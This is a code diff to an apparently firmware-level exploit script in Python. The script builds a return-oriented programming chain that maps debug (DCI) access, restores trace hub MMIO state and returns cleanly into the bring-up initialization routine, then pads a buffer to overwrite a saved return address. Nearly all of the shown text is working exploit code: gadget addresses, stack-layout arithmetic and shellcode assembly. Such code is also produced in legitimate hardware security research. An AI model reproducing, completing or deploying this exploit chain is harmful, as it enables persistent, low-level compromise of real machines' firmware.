@@ -31,7 +31,7 @@ def GenerateTHConfig():
 
     return trace_hub_config
 
-def GenerateRops():
+def GenerateRops(rop_address):
     print("[*] Generating rops...")
     #mapping DCI
     rops  = struct.pack("<L", 0x0004a76c) #side-band mapping 
@@ -59,22 +59,39 @@ def GenerateRops():
     rops += struct.pack("<L", 0x00008400) #param 2
     rops += struct.pack("<L", 0x00000003) #param 1
 
-    rops += struct.pack("<L", 0x0003d25b)
-    rops += struct.pack("<L", 0x00055ff0)
-    rops += struct.pack("<L", 0x00099010)
-    rops += struct.pack("<L", 0x00000000)*4
-    rops += struct.pack("<L", 0x00009dcc)
-    rops += struct.pack("<L", 0x00000000)*3
-    rops += struct.pack("<L", 0x0003d25d)
-    rops += struct.pack("<L", 0x00000000)
-    rops += struct.pack("<L", 0x00000001)
-    rops += struct.pack("<L", 0x00050004)
-    rops += struct.pack("<L", 0x00055d34)
-    rops += struct.pack("<L", 0x00035674)
-    rops += struct.pack("<L", 0x00000000)*4
-    rops += struct.pack("<L", 0x00055d3c)
-    rops += struct.pack("<L", 0x00035015)
-    rops += struct.pack("<L", 0x00000000)
+    #rops += struct.pack("<L", 0x0000a82d) # infinite loop
+    # Restore trace hub MMIO data
+    rops += struct.pack("<L", 0x000011BE) #put_sel_word
+    rops += struct.pack("<L", 0x0004a876) #pop 3 arguments
+    rops += struct.pack("<L", 0x000000BF) #param 3
+    rops += struct.pack("<L", 0x000000E0) #param 2
+    rops += struct.pack("<L", 0x00000000) #param 1
+    
+    rops += struct.pack("<L", 0x000011BE) #put_sel_word
+    rops += struct.pack("<L", 0x0004a876) #pop 3 arguments
+    rops += struct.pack("<L", 0x000000BF) #param 3
+    rops += struct.pack("<L", 0x00000010) #param 2
+    rops += struct.pack("<L", 0x88888888) #param 1
+    
+    rops += struct.pack("<L", 0x0000b578) # Pop 6 arguments
+    
+    rops += struct.pack("<L", 0x00055ff0) # edx
+    rops += struct.pack("<L", 0x00099010) #ecx
+    rops += struct.pack("<L", 0x00000000)*4 # ebx, esi, edi, ebp
+    rops += struct.pack("<L", 0x00009dcc) # mov [edx], ecx + pop 3 arguments (Restores SYSLIB Context address)
+    rops += struct.pack("<L", 0x00000000)*3 # ebx, esi, ebp
+    rops += struct.pack("<L", 0x0000b57a) # Pop 4 arguments
+    rops += struct.pack("<L", 0x00000000) # ebx
+    rops += struct.pack("<L", 0x00000001) # esi (array index)
+    rops += struct.pack("<L", 0x00050004) # edi - bup_init_scripts.second_array
+    #rops += struct.pack("<L", 0x00055d34) # ebp - TODO needs to be dependent on current position
+    rops += struct.pack("<L", rop_address + len(rops) + 0x18) # ebp
+    rops += struct.pack("<L", 0x00035674) # continue bip initialization after call to bup_init_trace_hub
+    rops += struct.pack("<L", 0x00000000)*4 # 4 values pushed to stack in #355E0
+    #rops += struct.pack("<L", 0x00055d3c) # ebp - TODO needs to be dependent on current position
+    rops += struct.pack("<L", rop_address + len(rops) + 0x8) # ebp
+    rops += struct.pack("<L", 0x00035015) # Return to called
+    rops += struct.pack("<L", 0x00000000) # ebp for bup_entry
     rops += struct.pack("<L", 0x000260A1)
 
     return rops
@@ -84,7 +101,7 @@ def GenerateShellCode():
     print("[*] Generating SYSLIB_CTX struct (stack base: %x: syslib ctx base: %x)..." % (STACK_BASE, syslib_ctx_start))
     data  = GenerateTHConfig()
     init_trace_len = len(data)
-    data += GenerateRops()
+    data += GenerateRops(STACK_BASE - BUFFER_OFFSET + init_trace_len)
     data += struct.pack("<B", 0x0)*(RET_ADDR_OFFSET - len(data))
     data += struct.pack("<L", 0x00016e1a) 
     data += struct.pack("<L", STACK_BASE - BUFFER_OFFSET + init_trace_len)
